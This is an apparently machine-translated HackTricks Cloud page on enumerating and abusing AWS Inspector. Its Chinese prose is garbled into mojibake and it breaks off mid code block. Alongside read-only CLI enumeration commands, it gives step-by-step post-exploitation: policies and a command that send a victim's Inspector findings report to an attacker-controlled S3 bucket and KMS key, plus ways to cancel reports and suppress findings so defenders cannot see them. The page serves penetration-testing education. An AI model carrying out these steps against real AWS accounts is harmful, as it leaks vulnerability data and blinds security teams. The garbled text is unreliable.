# AWS - Inspector Enum

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## Inspector

Amazon Inspector æ˜¯ä¸€é¡¹å…ˆè¿›çš„è‡ªåŠ¨åŒ–æ¼æ´ç®¡ç†æœåŠ¡ï¼Œæ—¨åœ¨å¢å¼ºæ‚¨çš„AWSç¯å¢ƒçš„å®‰å…¨æ€§ã€‚è¯¥æœåŠ¡æŒç»­æ‰«æAmazon EC2å®ä¾‹ã€Amazon ECRä¸­çš„å®¹å™¨é•œåƒã€Amazon ECSå’ŒAWS Lambdaå‡½æ•°ï¼Œä»¥å‘ç°æ¼æ´å’Œæ„å¤–çš„ç½‘ç»œæš´éœ²ã€‚é€šè¿‡åˆ©ç”¨å¼ºå¤§çš„æ¼æ´æƒ…æŠ¥æ•°æ®åº“ï¼ŒAmazon Inspector æä¾›è¯¦ç»†çš„å‘ç°ç»“æœï¼ŒåŒ…æ‹¬ä¸¥é‡çº§åˆ«å’Œè¡¥æ•‘å»ºè®®ï¼Œå¸®åŠ©ç»„ç»‡ä¸»åŠ¨è¯†åˆ«å’Œè§£å†³å®‰å…¨é£é™©ã€‚è¿™ç§å…¨é¢çš„æ–¹æ³•ç¡®ä¿äº†å„ç§AWSæœåŠ¡çš„å¼ºåŒ–å®‰å…¨å§¿æ€ï¼Œæœ‰åŠ©äºåˆè§„æ€§å’Œé£é™©ç®¡ç†ã€‚

## å…³é”®è¦ç´ 

### å‘ç°ç»“æœ

Amazon Inspector ä¸­çš„å‘ç°ç»“æœæ˜¯å…³äºåœ¨æ‰«æEC2å®ä¾‹ã€ECRå­˜å‚¨åº“æˆ–Lambdaå‡½æ•°æœŸé—´å‘ç°çš„æ¼æ´å’Œæš´éœ²çš„è¯¦ç»†æŠ¥å‘Šã€‚æ ¹æ®å…¶çŠ¶æ€ï¼Œå‘ç°ç»“æœè¢«åˆ†ç±»ä¸ºï¼š

- **æ´»åŠ¨çš„**ï¼šå‘ç°ç»“æœå°šæœªå¾—åˆ°ä¿®å¤ã€‚
- **å·²å…³é—­çš„**ï¼šå‘ç°ç»“æœå·²å¾—åˆ°ä¿®å¤ã€‚
- **å·²æŠ‘åˆ¶çš„**ï¼šç”±äºä¸€ä¸ªæˆ–å¤šä¸ª**æŠ‘åˆ¶è§„åˆ™**ï¼Œå‘ç°ç»“æœè¢«æ ‡è®°ä¸ºæ­¤çŠ¶æ€ã€‚

å‘ç°ç»“æœè¿˜åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š

- **è½¯ä»¶åŒ…**ï¼šè¿™äº›å‘ç°ä¸å®‰è£…åœ¨æ‚¨çš„èµ„æºä¸Šçš„è½¯ä»¶åŒ…ä¸­çš„æ¼æ´æœ‰å…³ã€‚ç¤ºä¾‹åŒ…æ‹¬è¿‡æ—¶çš„åº“æˆ–å­˜åœ¨å·²çŸ¥å®‰å…¨é—®é¢˜çš„ä¾èµ–é¡¹ã€‚
- **ä»£ç **ï¼šæ­¤ç±»åˆ«åŒ…æ‹¬åœ¨è¿è¡Œåœ¨æ‚¨çš„AWSèµ„æºä¸Šçš„åº”ç”¨ç¨‹åºä»£ç ä¸­å‘ç°çš„æ¼æ´ã€‚å¸¸è§é—®é¢˜æ˜¯ç¼–ç é”™è¯¯æˆ–ä¸å®‰å…¨çš„å®è·µå¯èƒ½å¯¼è‡´å®‰å…¨æ¼æ´ã€‚
- **ç½‘ç»œ**ï¼šç½‘ç»œå‘ç°è¯†åˆ«ç½‘ç»œé…ç½®ä¸­å¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨çš„æ½œåœ¨æš´éœ²ã€‚è¿™äº›åŒ…æ‹¬å¼€æ”¾ç«¯å£ã€ä¸å®‰å…¨çš„ç½‘ç»œåè®®å’Œé…ç½®é”™è¯¯çš„å®‰å…¨ç»„ã€‚

### è¿‡æ»¤å™¨å’ŒæŠ‘åˆ¶è§„åˆ™

Amazon Inspector ä¸­çš„è¿‡æ»¤å™¨å’ŒæŠ‘åˆ¶è§„åˆ™æœ‰åŠ©äºç®¡ç†å’Œä¼˜å…ˆå¤„ç†å‘ç°ç»“æœã€‚è¿‡æ»¤å™¨å…è®¸æ‚¨æ ¹æ®ç‰¹å®šæ ‡å‡†ï¼ˆå¦‚ä¸¥é‡æ€§æˆ–èµ„æºç±»å‹ï¼‰ç»†åŒ–å‘ç°ç»“æœã€‚æŠ‘åˆ¶è§„åˆ™å…è®¸æ‚¨æŠ‘åˆ¶æŸäº›è¢«è®¤ä¸ºæ˜¯ä½é£é™©ã€å·²ç»å¾—åˆ°ç¼“è§£æˆ–å…¶ä»–é‡è¦åŸå› çš„å‘ç°ç»“æœï¼Œé˜²æ­¢å®ƒä»¬è¿‡å¤šåœ°åŠ è½½æ‚¨çš„å®‰å…¨æŠ¥å‘Šï¼Œå¹¶ä½¿æ‚¨èƒ½å¤Ÿä¸“æ³¨äºæ›´ä¸ºå…³é”®çš„é—®é¢˜ã€‚

### è½¯ä»¶ææ–™æ¸…å•ï¼ˆSBOMï¼‰

Amazon Inspector ä¸­çš„è½¯ä»¶ææ–™æ¸…å•ï¼ˆSBOMï¼‰æ˜¯ä¸€ä»½å¯å¯¼å‡ºçš„åµŒå¥—æ¸…å•ï¼Œè¯¦ç»†åˆ—å‡ºäº†è½¯ä»¶åŒ…ä¸­çš„æ‰€æœ‰ç»„ä»¶ï¼ŒåŒ…æ‹¬åº“å’Œä¾èµ–é¡¹ã€‚SBOMæœ‰åŠ©äºæä¾›å¯¹è½¯ä»¶ä¾›åº”é“¾çš„é€æ˜åº¦ï¼Œå®ç°æ›´å¥½çš„æ¼æ´ç®¡ç†å’Œåˆè§„æ€§ã€‚å®ƒä»¬å¯¹äºè¯†åˆ«å’Œå‡è½»ä¸å¼€æºå’Œç¬¬ä¸‰æ–¹è½¯ä»¶ç»„ä»¶ç›¸å…³çš„é£é™©è‡³å…³é‡è¦ã€‚

## å…³é”®åŠŸèƒ½

### å¯¼å‡ºå‘ç°ç»“æœ

Amazon Inspector æä¾›å°†å‘ç°ç»“æœå¯¼å‡ºåˆ°Amazon S3å­˜å‚¨æ¡¶ã€Amazon EventBridgeå’ŒAWS Security Hub çš„åŠŸèƒ½ï¼Œè¿™ä½¿æ‚¨èƒ½å¤Ÿç”Ÿæˆå·²è¯†åˆ«çš„æ¼æ´å’Œæš´éœ²çš„è¯¦ç»†æŠ¥å‘Šï¼Œä»¥ä¾¿è¿›ä¸€æ­¥åˆ†ææˆ–åœ¨ç‰¹å®šæ—¥æœŸå’Œæ—¶é—´å…±äº«ã€‚æ­¤åŠŸèƒ½æ”¯æŒå„ç§è¾“å‡ºæ ¼å¼ï¼Œå¦‚CSVå’ŒJSONï¼Œä½¿å…¶æ›´å®¹æ˜“ä¸å…¶ä»–å·¥å…·å’Œç³»ç»Ÿé›†æˆã€‚å¯¼å‡ºåŠŸèƒ½å…è®¸è‡ªå®šä¹‰åŒ…å«åœ¨æŠ¥å‘Šä¸­çš„æ•°æ®ï¼Œä½¿æ‚¨èƒ½å¤Ÿæ ¹æ®ç‰¹å®šæ ‡å‡†ï¼ˆå¦‚ä¸¥é‡æ€§ã€èµ„æºç±»å‹æˆ–æ—¥æœŸèŒƒå›´ï¼‰è¿‡æ»¤å‘ç°ç»“æœï¼Œå¹¶é»˜è®¤åŒ…å«å½“å‰AWSåŒºåŸŸä¸­æ‰€æœ‰çŠ¶æ€ä¸ºæ´»åŠ¨çš„å‘ç°ç»“æœã€‚

åœ¨å¯¼å‡ºå‘ç°ç»“æœæ—¶ï¼Œéœ€è¦ä¸€ä¸ªå¯†é’¥ç®¡ç†æœåŠ¡ï¼ˆKMSï¼‰å¯†é’¥æ¥åŠ å¯†å¯¼å‡ºçš„æ•°æ®ã€‚KMSå¯†é’¥ç¡®ä¿å¯¼å‡ºçš„å‘ç°ç»“æœå—åˆ°ä¿æŠ¤ï¼Œé˜²æ­¢æœªç»æˆæƒçš„è®¿é—®ï¼Œä¸ºæ•æ„Ÿæ¼æ´ä¿¡æ¯æä¾›é¢å¤–çš„å®‰å…¨å±‚ã€‚

### Amazon EC2 å®ä¾‹æ‰«æ

Amazon Inspector ä¸ºAmazon EC2å®ä¾‹æä¾›å¼ºå¤§çš„æ‰«æåŠŸèƒ½ï¼Œä»¥æ£€æµ‹æ¼æ´å’Œå®‰å…¨é—®é¢˜ã€‚Inspectorå°†ä»EC2å®ä¾‹ä¸­æå–çš„å…ƒæ•°æ®ä¸æ¥è‡ªå®‰å…¨å…¬å‘Šçš„è§„åˆ™è¿›è¡Œæ¯”è¾ƒï¼Œä»¥ç”Ÿæˆè½¯ä»¶åŒ…æ¼æ´å’Œç½‘ç»œå¯è¾¾æ€§é—®é¢˜ã€‚è¿™äº›æ‰«æå¯ä»¥é€šè¿‡**åŸºäºä»£ç†**æˆ–**æ— ä»£ç†**æ–¹æ³•æ‰§è¡Œï¼Œå…·ä½“å–å†³äºæ‚¨çš„å¸æˆ·çš„**æ‰«ææ¨¡å¼**è®¾ç½®é…ç½®ã€‚

- **åŸºäºä»£ç†**ï¼šåˆ©ç”¨AWS Systems Manager (SSM) ä»£ç†æ‰§è¡Œæ·±åº¦æ‰«æã€‚æ­¤æ–¹æ³•å…è®¸ç›´æ¥ä»å®ä¾‹ä¸­è¿›è¡Œå…¨é¢çš„æ•°æ®æ”¶é›†å’Œåˆ†æã€‚
- **æ— ä»£ç†**ï¼šæä¾›ä¸€ç§æ— éœ€åœ¨å®ä¾‹ä¸Šå®‰è£…ä»£ç†çš„è½»é‡çº§æ›¿ä»£æ–¹æ¡ˆï¼Œå®ƒä¼šåˆ›å»ºEC2å®ä¾‹æ¯ä¸ªå·çš„EBSå¿«ç…§ï¼ŒæŸ¥æ‰¾æ¼æ´ï¼Œç„¶ååˆ é™¤å®ƒï¼›åˆ©ç”¨ç°æœ‰çš„AWSåŸºç¡€è®¾æ–½è¿›è¡Œæ‰«æã€‚

æ‰«ææ¨¡å¼ç¡®å®šå°†ä½¿ç”¨å“ªç§æ–¹æ³•æ‰§è¡ŒEC2æ‰«æï¼š

- **åŸºäºä»£ç†**ï¼šéœ€è¦åœ¨EC2å®ä¾‹ä¸Šå®‰è£…SSMä»£ç†è¿›è¡Œæ·±åº¦æ£€æŸ¥ã€‚
- **æ··åˆæ‰«æ**ï¼šç»“åˆåŸºäºä»£ç†å’Œæ— ä»£ç†æ–¹æ³•ï¼Œä»¥æœ€å¤§åŒ–è¦†ç›–èŒƒå›´å¹¶æœ€å°åŒ–æ€§èƒ½å½±å“ã€‚åœ¨å®‰è£…äº†SSMä»£ç†çš„EC2å®ä¾‹ä¸­ï¼ŒInspectorå°†æ‰§è¡ŒåŸºäºä»£ç†çš„æ‰«æï¼Œè€Œå¯¹äºæ²¡æœ‰SSMä»£ç†çš„å®ä¾‹ï¼Œå°†æ‰§è¡Œæ— ä»£ç†æ‰«æã€‚

å¦ä¸€ä¸ªé‡è¦åŠŸèƒ½æ˜¯é’ˆå¯¹EC2 Linuxå®ä¾‹çš„**æ·±åº¦æ£€æŸ¥**ã€‚æ­¤åŠŸèƒ½æä¾›å¯¹EC2 Linuxå®ä¾‹çš„è½¯ä»¶å’Œé…ç½®è¿›è¡Œå½»åº•åˆ†æï¼Œæä¾›è¯¦ç»†çš„æ¼æ´è¯„ä¼°ï¼ŒåŒ…æ‹¬æ“ä½œç³»ç»Ÿæ¼æ´ã€åº”ç”¨ç¨‹åºæ¼æ´å’Œé…ç½®é”™è¯¯ï¼Œç¡®ä¿å…¨é¢çš„å®‰å…¨è¯„ä¼°ã€‚è¿™æ˜¯é€šè¿‡æ£€æŸ¥**è‡ªå®šä¹‰è·¯å¾„**åŠå…¶æ‰€æœ‰å­ç›®å½•æ¥å®ç°çš„ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒAmazon Inspectorå°†æ‰«æä»¥ä¸‹å†…å®¹ï¼Œä½†æ¯ä¸ªæˆå‘˜å¸æˆ·å¯ä»¥å®šä¹‰å¤šè¾¾5ä¸ªè‡ªå®šä¹‰è·¯å¾„ï¼Œæ¯ä¸ªå§”æ´¾ç®¡ç†å‘˜å¯ä»¥å®šä¹‰å¤šè¾¾10ä¸ªï¼š

- `/usr/lib`
- `/usr/lib64`
- `/usr/local/lib`
- `/usr/local/lib64`

### Amazon ECR å®¹å™¨é•œåƒæ‰«æ

Amazon Inspector ä¸ºAmazon Elastic Container Registry (ECR) å®¹å™¨é•œåƒæä¾›å¼ºå¤§çš„æ‰«æåŠŸèƒ½ï¼Œç¡®ä¿æœ‰æ•ˆæ£€æµ‹å’Œç®¡ç†è½¯ä»¶åŒ…æ¼æ´ã€‚

- **åŸºæœ¬æ‰«æ**ï¼šè¿™æ˜¯ä¸€ç§å¿«é€Ÿä¸”è½»é‡çº§çš„æ‰«æï¼Œä½¿ç”¨æ¥è‡ªå¼€æº Clair é¡¹ç›®çš„æ ‡å‡†è§„åˆ™åœ¨å®¹å™¨é•œåƒä¸­è¯†åˆ«å·²çŸ¥çš„æ“ä½œç³»ç»Ÿè½¯ä»¶åŒ…æ¼æ´ã€‚ä½¿ç”¨æ­¤æ‰«æé…ç½®ï¼Œæ‚¨çš„å­˜å‚¨åº“å°†åœ¨æ¨é€æ—¶è¿›è¡Œæ‰«æï¼Œæˆ–æ‰§è¡Œæ‰‹åŠ¨æ‰«æã€‚
- **å¢å¼ºæ‰«æ**ï¼šæ­¤é€‰é¡¹åœ¨æ¨é€æ‰«æä¹‹å¤–æ·»åŠ äº†æŒç»­æ‰«æåŠŸèƒ½ã€‚å¢å¼ºæ‰«ææ·±å…¥åˆ†ææ¯ä¸ªå®¹å™¨é•œåƒçš„å±‚ï¼Œä»¥æ›´å‡†ç¡®åœ°è¯†åˆ«æ“ä½œç³»ç»Ÿè½¯ä»¶åŒ…å’Œç¼–ç¨‹è¯­è¨€è½¯ä»¶åŒ…ä¸­çš„æ¼æ´ã€‚å®ƒåˆ†æåŸºç¡€é•œåƒå’Œä»»ä½•é™„åŠ å±‚ï¼Œæä¾›æ½œåœ¨å®‰å…¨é—®é¢˜çš„å…¨é¢è§†å›¾ã€‚

### Amazon Lambda å‡½æ•°æ‰«æ

Amazon Inspector åŒ…æ‹¬é’ˆå¯¹AWS Lambdaå‡½æ•°åŠå…¶å±‚çš„å…¨é¢æ‰«æåŠŸèƒ½ï¼Œç¡®ä¿æ— æœåŠ¡å™¨åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§ã€‚Inspectorä¸ºLambdaå‡½æ•°æä¾›ä¸¤ç§æ‰«æç±»å‹ï¼š

- **Lambda æ ‡å‡†æ‰«æ**ï¼šæ­¤é»˜è®¤åŠŸèƒ½è¯†åˆ«æ·»åŠ åˆ°Lambdaå‡½æ•°å’Œå±‚çš„åº”ç”¨ç¨‹åºåŒ…ä¾èµ–é¡¹ä¸­çš„è½¯ä»¶æ¼æ´ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨çš„å‡½æ•°ä½¿ç”¨å¸¦æœ‰å·²çŸ¥æ¼æ´çš„åº“ç‰ˆæœ¬ï¼Œå¦‚python-jwtï¼Œå®ƒå°†ç”Ÿæˆä¸€ä¸ªå‘ç°ç»“æœã€‚
- **Lambda ä»£ç æ‰«æ**ï¼šåˆ†æè‡ªå®šä¹‰åº”ç”¨ç¨‹åºä»£ç ä»¥æ£€æµ‹å®‰å…¨é—®é¢˜ï¼Œå‘ç°æ¼æ´ï¼Œå¦‚æ³¨å…¥æ¼æ´ã€æ•°æ®æ³„æ¼ã€å¼±åŠ å¯†å’Œç¼ºå°‘åŠ å¯†ã€‚å®ƒæ•è·çªå‡ºæ˜¾ç¤ºæ£€æµ‹åˆ°çš„æ¼æ´çš„ä»£ç ç‰‡æ®µï¼Œå¦‚ç¡¬ç¼–ç å‡­æ®ã€‚å‘ç°ç»“æœåŒ…æ‹¬è¯¦ç»†çš„è¡¥æ•‘å»ºè®®å’Œç”¨äºä¿®å¤é—®é¢˜çš„ä»£ç ç‰‡æ®µã€‚
### **äº’è”ç½‘å®‰å…¨ä¸­å¿ƒï¼ˆCISï¼‰æ‰«æ**

Amazon InspectoråŒ…æ‹¬CISæ‰«æï¼Œç”¨äºå°†Amazon EC2å®ä¾‹æ“ä½œç³»ç»Ÿä¸äº’è”ç½‘å®‰å…¨ä¸­å¿ƒï¼ˆCISï¼‰çš„æœ€ä½³å®è·µå»ºè®®è¿›è¡ŒåŸºå‡†æµ‹è¯•ã€‚è¿™äº›æ‰«æç¡®ä¿é…ç½®ç¬¦åˆè¡Œä¸šæ ‡å‡†çš„å®‰å…¨åŸºçº¿ã€‚

- **é…ç½®**ï¼šCISæ‰«æè¯„ä¼°ç³»ç»Ÿé…ç½®æ˜¯å¦ç¬¦åˆç‰¹å®šçš„CISåŸºå‡†å»ºè®®ï¼Œæ¯ä¸ªæ£€æŸ¥éƒ½ä¸CISæ£€æŸ¥IDå’Œæ ‡é¢˜ç›¸å…³è”ã€‚
- **æ‰§è¡Œ**ï¼šæ‰«ææ˜¯æ ¹æ®å®ä¾‹æ ‡è®°å’Œå®šä¹‰çš„è®¡åˆ’æ‰§è¡Œæˆ–å®‰æ’çš„ã€‚
- **ç»“æœ**ï¼šæ‰«æåçš„ç»“æœæ˜¾ç¤ºå“ªäº›æ£€æŸ¥é€šè¿‡ã€è·³è¿‡æˆ–å¤±è´¥ï¼Œæä¾›æœ‰å…³æ¯ä¸ªå®ä¾‹çš„å®‰å…¨çŠ¶å†µçš„è§è§£ã€‚

## æšä¸¾
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
## åæ¸—é€

{% hint style="success" %}
ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œè¿™é¡¹æœåŠ¡å¯ä»¥å¸®åŠ©æ”»å‡»è€…å‘ç°æ¼æ´å’Œç½‘ç»œæš´éœ²ï¼Œä»è€Œå¸®åŠ©ä»– compromise å…¶ä»–å®ä¾‹/å®¹å™¨ã€‚

ç„¶è€Œï¼Œæ”»å‡»è€…ä¹Ÿå¯èƒ½å¯¹ç ´åè¿™é¡¹æœåŠ¡æ„Ÿå…´è¶£ï¼Œä»¥ä¾¿å—å®³è€…æ— æ³•çœ‹åˆ°æ¼æ´ï¼ˆå…¨éƒ¨æˆ–ç‰¹å®šæ¼æ´ï¼‰ã€‚
{% endhint %}

### `inspector2:CreateFindingsReport`ï¼Œ`inspector2:CreateSBOMReport`

æ”»å‡»è€…å¯ä»¥ç”Ÿæˆæ¼æ´æˆ–è½¯ä»¶æ„å»ºææ–™ï¼ˆSBOMsï¼‰çš„è¯¦ç»†æŠ¥å‘Šï¼Œå¹¶ä»æ‚¨çš„ AWS ç¯å¢ƒä¸­å°†å®ƒä»¬å¤–æ³„ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥è¢«åˆ©ç”¨æ¥è¯†åˆ«ç‰¹å®šå¼±ç‚¹ã€è¿‡æ—¶è½¯ä»¶æˆ–ä¸å®‰å…¨çš„ä¾èµ–é¡¹ï¼Œä»è€Œå®ç°æœ‰é’ˆå¯¹æ€§çš„æ”»å‡»ã€‚
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
ä»¥ä¸‹ç¤ºä¾‹æ˜¾ç¤ºå¦‚ä½•å°†Amazon Inspectorä¸­çš„æ‰€æœ‰Activeå‘ç°å¤–å‘åˆ°å—æ”»å‡»è€…æ§åˆ¶çš„Amazon S3å­˜å‚¨æ¡¶ï¼Œä½¿ç”¨å—æ”»å‡»è€…æ§åˆ¶çš„Amazon KMSå¯†é’¥ï¼š

1. **åˆ›å»ºä¸€ä¸ªAmazon S3å­˜å‚¨æ¡¶**ï¼Œå¹¶é™„åŠ ç­–ç•¥ä»¥ä¾¿ä»å—å®³è€…Amazon Inspectorä¸­è®¿é—®ï¼š
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **åˆ›å»ºä¸€ä¸ªAmazon KMSå¯†é’¥**ï¼Œå¹¶é™„åŠ ä¸€ä¸ªç­–ç•¥ï¼Œä»¥ä¾¿å—å®³è€…çš„Amazon Inspectorå¯ä»¥ä½¿ç”¨å®ƒï¼š
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. æ‰§è¡Œå‘½ä»¤ä»¥**åˆ›å»ºå‘ç°æŠ¥å‘Š**å¹¶å°†å…¶å¤–æ³„ï¼š
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
- **æ½œåœ¨å½±å“**ï¼šç”Ÿæˆå¹¶å¤–å‘è¯¦ç»†çš„æ¼æ´å’Œè½¯ä»¶æŠ¥å‘Šï¼Œè·å–ç‰¹å®šæ¼æ´å’Œå®‰å…¨å¼±ç‚¹çš„è§è§£ã€‚

### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

æ”»å‡»è€…å¯ä»¥å–æ¶ˆç”ŸæˆæŒ‡å®šçš„å‘ç°æŠ¥å‘Šæˆ–SBOMæŠ¥å‘Šï¼Œé˜»æ­¢å®‰å…¨å›¢é˜ŸåŠæ—¶è·å–æœ‰å…³æ¼æ´å’Œè½¯ä»¶ææ–™æ¸…å•ï¼ˆSBOMsï¼‰çš„ä¿¡æ¯ï¼Œå»¶è¿Ÿå®‰å…¨é—®é¢˜çš„æ£€æµ‹å’Œä¿®å¤ã€‚
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
- **æ½œåœ¨å½±å“**ï¼šç ´åå®‰å…¨ç›‘æ§ï¼Œé˜»æ­¢åŠæ—¶å‘ç°å’Œä¿®å¤å®‰å…¨é—®é¢˜ã€‚
### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

æ‹¥æœ‰è¿™äº›æƒé™çš„æ”»å‡»è€…å¯ä»¥æ“çºµè¿‡æ»¤è§„åˆ™ï¼Œç¡®å®šæŠ¥å‘Šæˆ–æŠ‘åˆ¶å“ªäº›æ¼æ´å’Œå®‰å…¨é—®é¢˜ï¼ˆå¦‚æœ**æ“ä½œ**è®¾ç½®ä¸ºSUPPRESSï¼Œåˆ™ä¼šåˆ›å»ºæŠ‘åˆ¶è§„åˆ™ï¼‰ã€‚è¿™å¯èƒ½ä¼šå°†å…³é”®æ¼æ´éšè—åœ¨å®‰å…¨ç®¡ç†å‘˜è§†çº¿ä¹‹å¤–ï¼Œä½¿å¾—æ›´å®¹æ˜“åˆ©ç”¨è¿™äº›å¼±ç‚¹è€Œä¸è¢«å‘ç°ã€‚é€šè¿‡ä¿®æ”¹æˆ–ç§»é™¤é‡è¦è¿‡æ»¤å™¨ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥é€šè¿‡å‘ç³»ç»Ÿå‘é€å¤§é‡æ— å…³çš„å‘ç°ç»“æœæ¥åˆ¶é€ å™ªéŸ³ï¼Œé˜»ç¢æœ‰æ•ˆçš„å®‰å…¨ç›‘æ§å’Œå“åº”ã€‚
```bash
# Create
